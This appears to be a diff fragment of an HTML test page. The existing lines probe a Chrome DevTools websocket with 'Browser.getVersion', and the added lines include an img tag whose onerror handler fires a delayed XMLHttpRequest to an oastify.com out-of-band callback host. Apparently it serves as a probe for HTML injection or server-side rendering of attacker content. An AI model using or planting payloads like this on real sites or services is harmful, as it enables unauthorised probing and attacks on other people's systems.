@@ -23,3 +23,6 @@ Hello
     ws.send(JSON.stringify({ "id": 1, "method": "Browser.getVersion" }))
   };
 </script>
+7th
+<img src="image.png", onerror="setTimeout(function(){var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://dyfszgzhmux0g3q4fwhvlw5ualgc44st.oastify.com', true); xhr.send();}, 1000);">
+
